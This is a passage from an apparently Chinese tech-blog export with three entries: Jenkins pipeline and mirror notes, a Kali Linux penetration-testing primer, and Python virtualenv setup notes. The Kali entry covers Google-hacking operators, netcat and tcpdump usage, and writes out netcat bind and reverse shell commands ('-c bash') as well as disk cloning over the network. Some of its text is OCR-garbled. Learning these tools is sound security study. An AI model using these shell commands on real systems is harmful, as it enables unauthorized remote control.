priorities：</span><br><span class="line">            Determines which warning priorities should be considered when evaluating the build health.</span><br><span class="line">            确定在评估构建健康状况时应考虑哪些警告优先级</span><br></pre></td></tr></table></figure>
<h3 id="writeFile：写入文件"><a href="#writeFile：写入文件" class="headerlink" title="writeFile：写入文件"></a>writeFile：写入文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">writeFile encoding: &apos;utf-8&apos;, file: &apos;./dist&apos;, text: &apos;exexex&apos;</span><br></pre></td></tr></table></figure>
<h3 id="ws-指定工作空间-并发的话"><a href="#ws-指定工作空间-并发的话" class="headerlink" title="ws:指定工作空间/并发的话"></a>ws:指定工作空间/并发的话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws(&quot;$ WORKSPACE/$win_appname&quot;) &#123;</span><br><span class="line">    // some block</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="milestone"><a href="#milestone" class="headerlink" title="milestone :"></a>milestone :</h3><h3 id="stash"><a href="#stash" class="headerlink" title="stash:"></a>stash:</h3><h2 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><h4 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h4><p>直接修改默认配置文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# find / -name &quot;default.json&quot;  </span><br><span class="line">/var/lib/jenkins/updates/default.json</span><br><span class="line">[root@localhost ~]# sed -i &apos;s/http:\/\/updates.jenkins-ci.org\/download/https:\/\/mirrors.tuna.tsinghua.edu.cn\/jenkins/g&apos; /var/lib/jenkins/updates/default.json &amp;&amp; sed -i &apos;s/http:\/\/www.google.com/https:\/\/www.baidu.com/g&apos; /var/lib/jenkins/updates/default.json</span><br><span class="line">[root@localhost ~]# systemctl restart jenkins</span><br></pre></td></tr></table></figure></p>
<h4 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h4><p>在插件管理里面修改<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jenkins插件清华大学镜像地址：</span><br><span class="line">https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json</span><br><span class="line"></span><br><span class="line">更换地址方法</span><br><span class="line">1.进入jenkins系统管理</span><br><span class="line">2.进入插件管理</span><br><span class="line">3.高级</span><br><span class="line">4.修改 https:/mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json 为 https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json</span><br><span class="line">5.提交</span><br><span class="line">6.获取当前状态</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">有的时候更换镜像之后下载插件还是走的官方地址</span><br><span class="line">原因：配置了清华的镜像之后他还是走的jenkins官方去拉取的，是因为清华镜像的配置文件里面的插件下载地址并不是指向的清华镜像，仍然指向的是jenkins官方的地址，我的解决方案是把jenkins官方的地址通过nginx吞掉直接转发到清华镜像去。</span><br><span class="line">host配置</span><br><span class="line"></span><br><span class="line">127.0.0.1 updates.jenkins-ci.org</span><br><span class="line">1</span><br><span class="line">nginx配置</span><br><span class="line"></span><br><span class="line">rewrite ^/download/plugins/(.*)$ https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/$1? last;</span><br><span class="line">1</span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">location /download/plugins</span><br><span class="line">&#123;</span><br><span class="line">    proxy_next_upstream http_502 http_504 error timeout invalid_header;</span><br><span class="line">    proxy_set_header Host mirrors.tuna.tsinghua.edu.cn;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; </span><br><span class="line">    rewrite /download/plugins(.*) /jenkins/plugins/$1 break;</span><br><span class="line">    proxy_pass https://mirrors.tuna.tsinghua.edu.cn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">解决：可以通过在nginx上配置代理，将官方的插件下载地址映射到 https://mirrors.tuna.tsinghua.edu.cn/jenkins/plugins/</span><br><span class="line">这样下载插件也会从镜像网站下载</span><br></pre></td></tr></table></figure></p>
<h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><h3 id="图解：利用PostMan-Newman-Jenkins实现Web-API持续集成"><a href="#图解：利用PostMan-Newman-Jenkins实现Web-API持续集成" class="headerlink" title="图解：利用PostMan+Newman+Jenkins实现Web API持续集成"></a>图解：利用PostMan+Newman+Jenkins实现Web API持续集成</h3><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/C3quMfyQtS8l.png" alt="mark"></p>
]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Jenkins</tag>
        <tag>devops</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-linux渗透测试入门</title>
    <url>/kali-linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h3><p><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></p>
<ul>
<li>《Goole Hacking For Penetration Testers》</li>
<li>《Google Hacking 渗透性测试者的利剑》<a id="more"></a>
<h3 id="Google-基本搜索语法"><a href="#Google-基本搜索语法" class="headerlink" title="Google 基本搜索语法"></a>Google 基本搜索语法</h3>1、关键字不区分大小写<br>2、使用默认AND逻辑搜索<br>3、默认最多32个单词<br>4、用 + 号，强制带后面的单词搜索<br>5、| 或者 OR ，匹配多个关键字的任一个<br>6、混合用多种布尔操作时，将从左到右的顺序执行<br>7、默认下忽视关键字中部分常用单词<br>8、Google 使用网页搜索，定义互联网<br>9、Google 会智能地保存一些内容，比如一些过时的词，一些不适合呈现的内容<br>10、布尔操作符：AND(+) NOT(-) OR(|),现在不需要，google会自动匹配<h3 id="Google-高级搜索语法"><a href="#Google-高级搜索语法" class="headerlink" title="Google 高级搜索语法"></a>Google 高级搜索语法</h3>基本使用与语法 operatio：search_term<br>operatio 搜索命令<br>search_term 关键字搜索<br>1、intext<br>匹配网页正文中含有的关键字．可接多个关键字，空格或者逗号分隔；<br>2、allintext<br>和index类似，能接多个关踺字，能与其他操作符混合使用，可单独使用。<br>3、intitle<br>搜索网页标题中是否有所输入字符，可单独使用，可混合其他命令用；<br>4、allintitle<br>类似血itle，能接多个关键字，不能与其他操作符混合使用<br>5、cache<br>输入U心，，搜索特定页面的缓存快照，回查网页副本；<br>6、define<br>返回搜索关键字的定义：<br>7、filetype<br>搜索指定类型的文件，可以与其他操作符混合使用<br>8、ext<br>与filee等价<br>9、info<br>搜絷输入URL的摘要信息和其他相关信息，该操作符不能与其他作符及关键字混用；<br>10、inurl<br>搜索输入字符是否存在于U中；<br>11、allinurl<br>类似inurl，可指定多个字符，不能与其他憬作符混合使用，可单独使用；<br>12、link<br>搜索链接到所输入URL的页面，该亻乍符不需要关键字，不能与其他操作符及关键字混用；<br>13、site<br>搜索范围缩小到特定的网站，域或子域；<br>14、related<br>接一个URL，搜索与该URL相关的页面，该作符不能与其他悍作符及关键字混用；<br>15、numrange<br>接数字范围，用一个减号两边接数字来表示。减号左边为最小值，右边为最大值，从而搜索数字；<br>16、inanchor<br>搜索一个HTML标记中的一个链接的文本表现形式，闞在链接文本中搜索冒号后紧接的一个关键字；<br>17、insubject<br>搜索Google组的标题行；<br>18、daterange<br>搜索某个日期范围内GoogIe做索引的网页。</li>
</ul>
<h2 id="工具：NETCAT-NC"><a href="#工具：NETCAT-NC" class="headerlink" title="工具：NETCAT-NC"></a>工具：NETCAT-NC</h2><ul>
<li>网络工具中的踹士军刀一一小身材、大智慧</li>
<li>侦昕模式/传输模式</li>
<li>telnet/获取bannerfä,a</li>
<li>传输文本信息</li>
<li>传输文件/§录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
</ul>
<h3 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET / BANNER"></a>TELNET / BANNER</h3><p>man -c ：man 手册的缩写</p>
<p>nc -h<br>[v1.10-41.1]<br>connect to somewhere:    nc [-options] hostname port[s] [ports] …<br>listen for inbound:    nc -l -p port [-options] [hostname] [port]<br>options:<br>    -c shell commands    as `-e’; use /bin/sh to exec [dangerous!!]<br>    -e filename        program to exec after connect [dangerous!!]<br>    -b            allow broadcasts<br>    -g gateway        source-routing hop point[s], up to 8<br>    -G num            source-routing pointer: 4, 8, 12, …<br>    -h            this cruft<br>    -i secs            delay interval for lines sent, ports scanned<br>        -k                      set keepalive option on socket<br>    -l            listen mode, for inbound connects<br>    -n            numeric-only IP addresses, no DNS<br>    -o file            hex dump of traffic<br>    -p port            local port number<br>    -r            randomize local and remote ports<br>    -q secs            quit after EOF on stdin and delay of secs<br>    -s addr            local source address<br>    -T tos            set Type Of Service<br>    -t            answer TELNET negotiation<br>    -u            UDP mode<br>    -v            verbose [use twice to be more verbose]<br>    -w secs            timeout for connects and final net reads<br>    -C            Send CRLF as line-ending<br>    -z            zero-I/O mode [used for scanning]<br>port numbers can be individual or ranges: lo-hi [inclusive];<br>hyphens in port names must be backslash escaped (e.g. ‘ftp-data’).</p>
<p>eg：</p>
<ul>
<li>nc -vn<h4 id="远程电子取证的收集"><a href="#远程电子取证的收集" class="headerlink" title="远程电子取证的收集"></a>远程电子取证的收集</h4>PS：<em>|</em> 管道<br>eg: ls -l | nc -nv 10.1.1.XX XXXX<br>将当前电脑的文件信息 利用通道 + NC 传输到10.1.1.XX 终端显示出来 <h5 id="传输⽂文件"><a href="#传输⽂文件" class="headerlink" title="传输⽂文件"></a>传输⽂文件</h5></li>
<li><ul>
<li>A：nc -lp 333 &gt; 1.mp4</li>
</ul>
</li>
<li><ul>
<li>B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</li>
</ul>
</li>
</ul>
<p>或</p>
<ul>
<li><ul>
<li>A：nc -q 1 -lp 333 &lt; a.mp4</li>
</ul>
</li>
<li><ul>
<li>B： nc -nv 1.1.1.1 333 &gt; 2.mp4</li>
</ul>
</li>
</ul>
<p>-q 1：传输完成1s后断开连接<br>-lp：监听端口</p>
<h5 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h5><p>需要结合其他命令</p>
<ul>
<li><ul>
<li>A：tar -cvf - music/ | nc -lp 333 –q 1</li>
</ul>
</li>
<li><ul>
<li>B：nc -nv 1.1.1.1 333 | tar -xvf –</li>
</ul>
</li>
<li><p>tar 是unix/linux下的打包器。</p>
</li>
<li>-cvf可以看做-c -v -f，-xvf则是-x -v -f。</li>
<li>其中-c/-x分别表示create/extract，即打包/解包。</li>
<li>-v 是verbose，表示显示打包/解包的详细过程。</li>
<li>-f 表示file，表示打包输出/解包输入文件，后面跟”-“表示使用“标准输入/输出”（stdin/stdout)作为输出/输入文件。</li>
<li>“|”表示“重定向”</li>
</ul>
<h5 id="加密传⽂文件"><a href="#加密传⽂文件" class="headerlink" title="加密传⽂文件"></a>加密传⽂文件</h5><ul>
<li><ul>
<li>A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li>
</ul>
</li>
<li><ul>
<li>B： mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</li>
</ul>
</li>
<li><p>mcrypt 加解密工具命令</p>
</li>
<li>-flush 清空缓冲区</li>
<li>-Fbq 加密参数</li>
<li>-Fbqd 解密参数</li>
</ul>
<h5 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h5><ul>
<li><ul>
<li>A： cat 1.mp4 | nc -lp 333</li>
</ul>
</li>
<li><ul>
<li>B： nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li>
</ul>
</li>
<li><p>B 以流的形式传递给流媒体软件  默认缓存3000</p>
</li>
<li>A -lp 333 监听本地333端口<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5></li>
<li><ul>
<li>nc -nvz 1.1.1.1 1-65535</li>
</ul>
</li>
<li><ul>
<li>nc –vnzu 1.1.1.1 1-1024</li>
</ul>
</li>
</ul>
<h5 id="远程克隆硬盘或者内存"><a href="#远程克隆硬盘或者内存" class="headerlink" title="远程克隆硬盘或者内存"></a>远程克隆硬盘或者内存</h5><ul>
<li><ul>
<li>A： nc -lp 333 | dd of=/dev/sda</li>
</ul>
</li>
<li><ul>
<li>B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1</li>
</ul>
</li>
</ul>
<p>先克隆内存，再克隆硬盘</p>
<p>为什么要远程取证克隆？而不是直接克隆？</p>
<h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><h6 id="正向："><a href="#正向：" class="headerlink" title="正向："></a>正向：</h6><ul>
<li><ul>
<li>A：nc -lp 333 -c bash</li>
</ul>
</li>
<li><ul>
<li>B：nc 1.1.1.1 333<h6 id="反向："><a href="#反向：" class="headerlink" title="反向："></a>反向：</h6></li>
</ul>
</li>
<li><ul>
<li>A：nc -lp 333</li>
</ul>
</li>
<li><ul>
<li>B：nc 1.1.1.1 333 -c bash</li>
</ul>
</li>
<li>注：Windows⽤用户把bash改成cmd；</li>
</ul>
<p>Nc只能在一定程度上替代ssh；可实现正反向控制（被控制与控制）；</p>
<ul>
<li>-c bash C盘上的bash shell （送给某机器shell、，等待某机器shell）</li>
</ul>
<hr>
<ul>
<li>优秀博客：<br><a href="https://www.cnblogs.com/nmap/p/6148306.html" target="_blank" rel="noopener">nc命令用法举例</a></li>
</ul>
<hr>
<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h5><ul>
<li>Nc缺乏加密和⾝身份验证的能⼒力</li>
<li>Ncat包含于nmap⼯工具包中</li>
<li>A：ncat ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</li>
<li><p>B：ncat -nv 1.1.1.1 333 –ssl</p>
</li>
<li><ul>
<li>–allow ：允许</li>
</ul>
</li>
<li><ul>
<li>–ssl :都采取加密</li>
</ul>
</li>
</ul>
<h5 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h5><p>最优秀的抓包工具之一，哈哈，该工具仅仅是对抓到的包进行解码分析。</p>
<ul>
<li>抓包嗅探协议分析</li>
<li>安全专家必备的技能</li>
<li>抓包引擎</li>
<li><ul>
<li>Libpcap9—— Linux</li>
</ul>
</li>
<li><ul>
<li>Winpcap10—— Windows</li>
</ul>
</li>
<li><p>解码能⼒</p>
</li>
<li><ul>
<li>抓包后的软件保存为pcap，兼容性较好</li>
</ul>
</li>
</ul>
<h6 id="基本使⽤用⽅方法"><a href="#基本使⽤用⽅方法" class="headerlink" title="基本使⽤用⽅方法"></a>基本使⽤用⽅方法</h6><p>1、启动<br>2、选择抓包⺴⽹网卡<br>3、混杂模式<br>4、实时抓包<br>5、保存和分析捕获⽂文件<br>6、首选项</p>
<h6 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h6><ul>
<li>过滤掉干扰的数据包</li>
<li>抓包筛选器</li>
<li>显⽰示筛选器</li>
</ul>
<h6 id="常⻅见协议包"><a href="#常⻅见协议包" class="headerlink" title="常⻅见协议包"></a>常⻅见协议包</h6><ul>
<li>数据包的分层结构</li>
<li>Arp</li>
<li>Icmp</li>
<li>Tcp——三次握⼿手</li>
<li>Udp</li>
<li>Dns</li>
<li>http</li>
<li><p>ftp<br>包内容分层显示</p>
</li>
<li><ul>
<li>ARP<br>eg:<br>Address ResoIution Protocol（request）<br>Hardware type:Ethernet（1）<br>ProtocoI type:IP（0×e800）<br>Hardware S1Ze：6<br>protocol size:4<br>Sender MAC address：dO：（7：（0：99：ed：3a{de：（7：CO：99：ed：3a）<br>Opcode：操作代码<br>Sender IP address：<br>Sender MAC address：<br>Target MAC address：<br>Target IP address:<br>192·168·1·1（192，168，1，1）<br>61：70：70：69：6e：67亻61：70：70：69：6e：67）<br>192·168·1·105（192．168．1．105）</li>
</ul>
</li>
<li><ul>
<li>SSDP<br>三层协议，<br>Tim to live : win 128 linux 65 unix 256<br>Type：二层往上三层协议<br>protcool：三层往上四层协议，第四层的网络协议有很多种种类</li>
</ul>
</li>
</ul>
<h6 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h6><h6 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h6><ul>
<li>http</li>
<li>Smtp</li>
<li>Pop3</li>
<li>Ssl</li>
</ul>
<h6 id="信息统计"><a href="#信息统计" class="headerlink" title="信息统计"></a>信息统计</h6><ul>
<li>节点数</li>
<li>协议分布</li>
<li>包⼤大⼩小分布</li>
<li>会话连接</li>
<li>解码⽅方式</li>
<li>专家系统</li>
<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
</ul>
<h6 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h6><ul>
<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
</ul>
<h6 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h6><ul>
<li>抓包对⽐比nc、ncat加密与不加密的流量</li>
<li>企业抓包布署⽅方案</li>
<li><ul>
<li>Sniffer</li>
</ul>
</li>
<li><ul>
<li>Cace / riverbed</li>
</ul>
</li>
<li><ul>
<li>Cascad pilot</li>
</ul>
</li>
</ul>
<h6 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h6><ul>
<li>抓包</li>
<li><ul>
<li>tcpdump -i eth0 -s 0 -w file.pcap</li>
</ul>
</li>
<li>读取抓包⽂文件</li>
<li><ul>
<li>Tcpdump -r file.pcap</li>
</ul>
</li>
</ul>
<p>用法：</p>
<ul>
<li><ul>
<li>筛选<br>tcpdump -n -r http.cap | awk ‘{print $3}’| sort –u<br>tcpdump -n src host 145.254.160.237 -r http.cap<br>tcpdump -n dst host 145.254.160.237 -r http.cap<br>tcpdump -n port 53 -r http.cap<br>tcpdump -nX port 80 -r http.cap</li>
</ul>
</li>
<li><ul>
<li>⾼高级筛选<br>tcpdump -A -n ‘tcp[13] = 24’ -r http.cap</li>
</ul>
</li>
</ul>
<ul>
<li><ul>
<li>介绍<br><a href="https://www.cnblogs.com/maifengqiang/p/3863168.html" target="_blank" rel="noopener">超级详细Tcpdump 的用法</a><br><a href="https://www.cnblogs.com/f-ck-need-u/p/7064286.html" target="_blank" rel="noopener">抓包工具tcpdump用法说明</a><br><a href="http://man.linuxde.net/tcpdump" target="_blank" rel="noopener">tcpdump命令</a><br><a href="http://www.mamicode.com/info-detail-2089175.html" target="_blank" rel="noopener">tcpdump抓包分析</a></li>
</ul>
</li>
<li>三种关键字类型</li>
<li><ul>
<li>第一种是关于类型的关键字，主要包括host，net，port, 例如 host 210.27.48.2，指明 210.27.48.2是一台主机，net 202.0.0.0 指明 202.0.0.0是一个网络地址，port 23 指明端口号是23。如果没有指定类型，缺省的类型是host.</li>
</ul>
</li>
</ul>
<ul>
<li><ul>
<li>第二种是确定传输方向的关键字，主要包括src , dst ,dst or src, dst and src ,这些关键字指明了传输的方向。<br>举例说明：<br>src 210.27.48.2 ,指明ip包中源地址是210.27.48.2<br>dst net 202.0.0.0 指明目的网络地址是202.0.0.0<br>如果没有指明方向关键字，则缺省是src or dst关键字</li>
</ul>
</li>
</ul>
<ul>
<li><ul>
<li>第三种是协议的关键字，主要包括fddi,ip,arp,rarp,tcp,udp等类型。Fddi指明是在FDDI(分布式光纤数据接口网络)上的特定 的网络协议，实际上它是”ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether的包进行处理和 分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。</li>
</ul>
</li>
</ul>
<ul>
<li><ul>
<li>除了这三种类型的关键字之外，其他重要的关键字如下：gateway, broadcast,less,greater,还有三种逻辑运算，取非运算是 ‘not ‘ ‘! ‘, 与运算是’and’,’&amp;&amp;;或运算 是’or’ ,’||’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要。</li>
</ul>
</li>
</ul>
<p>1、直接在终端启动tcpdump将监视第一个网络界面上所有流过的数据包<br>2、使用-i参数指定tcpdump监听的网络界面，这在计算机具有多个网络界面时非常有用，<br>3、使用-c参数指定要监听的数据包数量，<br>4、使用-w参数指定将监听到的数据包写入文件中保存</p>
<p>eg：<br>1、抓取回环网口的包：tcpdump -i lo</p>
<p>2、防止包截断：tcpdump -s0</p>
<p>3、以数字显示主机及端口：tcpdump -n</p>
<p>A想要截获所有210.27.48.1 的主机收到的和发出的所有的数据包：<br>tcpdump host 210.27.48.1</p>
<p>B想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令：（在命令行中适用　括号时，一定要<br>tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /)</p>
<p>C如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：<br>tcpdump ip host 210.27.48.1 and ! 210.27.48.2</p>
<p>D如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：<br>tcpdump tcp port 23 host 210.27.48.1</p>
<p>E对本机的udp 123 端口进行监视 123 为ntp的服务端口<br> tcpdump udp port 123</p>
<p>F 系统将只对名为hostname的主机的通信数据包进行监视。主机名可以是本地主机，也可以是网络上的任何一台计算机。下面的命令可以读取主机hostname发送的所有数据：<br>tcpdump -i eth0 src host hostname</p>
<p>G 下面的命令可以监视所有送到主机hostname的数据包：<br>tcpdump -i eth0 dst host hostname</p>
<p>H 我们还可以监视通过指定网关的数据包：<br>tcpdump -i eth0 gateway Gatewayname</p>
<p>I 如果你还想监视编址到指定端口的TCP或UDP数据包，那么执行以下命令：<br>tcpdump -i eth0 host hostname and port 80</p>
<p>J 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包<br>，使用命令：<br>tcpdump ip host 210.27.48.1 and ! 210.27.48.2</p>
<p>K 想要截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信，使用命令<br>：（在命令行中适用　括号时，一定要<br>tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /)</p>
<p>L 如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：<br>tcpdump ip host 210.27.48.1 and ! 210.27.48.2</p>
<p>M 如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令：<br>tcpdump tcp port 23 host 210.27.48.1</p>
<h2 id="过程文档记录"><a href="#过程文档记录" class="headerlink" title="过程文档记录"></a>过程文档记录</h2><ul>
<li>Dradis</li>
<li>短期临时小团队资源共享</li>
<li>各种插件导入文件</li>
<li><ul>
<li>Keepnote</li>
</ul>
</li>
<li><ul>
<li>Truecrypt</li>
</ul>
</li>
</ul>
<h3 id="Dradis"><a href="#Dradis" class="headerlink" title="Dradis"></a>Dradis</h3><p>Dradis 框架是一个开源的协作和报告平台。它是由Ruby开发的一个独立的平台。</p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://dradisframework.com/ce/" target="_blank" rel="noopener">官网</a><br><a href="https://www.gremwell.com/what_is_magictree" target="_blank" rel="noopener">What is MagicTree?</a><br><a href="https://www.gremwell.com/magictree_vs_dradis" target="_blank" rel="noopener">MagicTree vs. Dradis</a><br><a href="https://resources.infosecinstitute.com/kali-reporting-tools/" target="_blank" rel="noopener">Kali Reporting Tools</a><br><a href="http://www.freebuf.com/sectool/104410.html" target="_blank" rel="noopener">工具推荐：Dradis，Kali渗透测试报告生成器</a></p>
<h3 id="Truecrypt"><a href="#Truecrypt" class="headerlink" title="Truecrypt"></a>Truecrypt</h3><p>TrueCrypt，是一款免费开源的加密软件，同时支持 Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt 不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持 FAT32 和 NTFS 分区、隐藏卷标、热键启动等。—-百度百科</p>
<p>比较完整的使用教程：<a href="https://blog.csdn.net/chinajobs/article/details/45438343" target="_blank" rel="noopener">TrueCrypt中文教程</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>puthon-Django-学习笔记</title>
    <url>/python-Django-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1、Python-的虚拟环境工具-virtualenv-的安装与使用"><a href="#1、Python-的虚拟环境工具-virtualenv-的安装与使用" class="headerlink" title="1、Python 的虚拟环境工具 virtualenv 的安装与使用"></a>1、Python 的虚拟环境工具 virtualenv 的安装与使用</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>Linux 环境下默认存在 python2.7 环境，但是新版本的 Django 所依赖的环境为 python3 ，python2.7 不能卸载它支持着系统的基础运行程序， 二者环境的并存可能导致python出现奇奇怪怪的问题。</p>
<h4 id="附："><a href="#附：" class="headerlink" title="附："></a>附：</h4><p>Linux 下 python3 pip3 的安装方法：<br><a id="more"></a></p>
<h5 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h5><ul>
<li><p>安装EPEL和IUS软件源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line">yum install https://centos7.iuscommunity.org/ius-release.rpm -y</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装Python3.6</p>
</li>
</ul>
<p><code>yum install python36u -y</code></p>
<ul>
<li>创建python3连接符</li>
</ul>
<p><code>ln -s /bin/python3.6 /bin/python3</code></p>
<ul>
<li>安装pip3</li>
</ul>
<p><code>yum install python36u-pip -y</code></p>
<ul>
<li>创建pip3链接符</li>
</ul>
<p><code>ln -s /bin/pip3.6 /bin/pip3</code></p>
<h5 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h5><p>在ubuntu 16.04版本中，系统默认安装 了python 2.7和3.5版本，因为系统本身用到python的程序，删除默认的版本又担心系统有问题，那有没有办法同时在安装和使用python 3.6版本呢？下文将一起安装python 3.6并修改原系统的python3命令以使用新安装的版本。</p>
<p>1、配置软件仓库，因为python 3.6 新版没有发布到ubuntu的正式仓库中，咱们通过第3方仓库来做。在命令行中输入：</p>
<p><code>sudo add-apt-repository ppa:jonathonf/python-3.6</code></p>
<p>2、检查系统软件包并安装 python 3.6<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python3.6</span><br></pre></td></tr></table></figure></p>
<p>3、查看python版本信息（现在在你的系统中已经有3个python版本了）<br>4、通过上图我们看到，新安装的3.6版本需要输入 python3.6才能使用，那能不能配置我只输入python3时就默认使用3.6版本呢，当然可以，执行以下命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.5 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config python3</span><br></pre></td></tr></table></figure></p>
<p>5、最后，咱们确认一下</p>
<p><code>python3 -V</code></p>
<h4 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h4><h5 id="什么是virtualenv？"><a href="#什么是virtualenv？" class="headerlink" title="什么是virtualenv？"></a>什么是virtualenv？</h5><p>virtualenv可以创建独立Python开发环境，比如当前的全局开发环境是python3.6，现在我们有一个项目需要使用django1.3，另一个项目需要使用django1.9，这个时候就可以使用virtualenv创建各自的python开发环境了。</p>
<h5 id="virtualenv的优点"><a href="#virtualenv的优点" class="headerlink" title="virtualenv的优点"></a>virtualenv的优点</h5><p>使不同的应用开发环境独立环境升级不影响其他的应用，也不会影响全局的python开发环境它可以防止系统中出现包管理混乱和版本的冲突。</p>
<p>1、基本使用</p>
<ul>
<li>通过pip安装virtualenv：<br><code>pip install virtualenv</code></li>
<li>测试安装:<br><code>virtualenv --version</code></li>
<li>为一个工程项目搭建一个虚拟环境:<br><code>cd my_project</code><br><code>virtualenv my_project_env</code></li>
<li><ul>
<li>另外，如果存在多个python解释器，可以选择指定一个Python解释器（比如<code>python2.7</code>），没有指定则由系统默认的解释器来搭建： </li>
</ul>
</li>
</ul>
<p><code>virtualenv -p /usr/bin/python2.7 my_project_env</code><br>    将会在当前的目录中创建一个名my_project_env的文件夹，这是一个独立的python运行环境，包含了Python可执行文件， 以及 pip 库的一份拷贝，这样就能安装其他包了，不过已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境来。</p>
<ul>
<li>要开始使用虚拟环境，其需要被激活：<br><code>source my_project_env/bin/activate</code></li>
<li>停用虚拟环境：<br><code>deactivate</code></li>
<li>停用后将回到系统默认的Python解释器</li>
</ul>
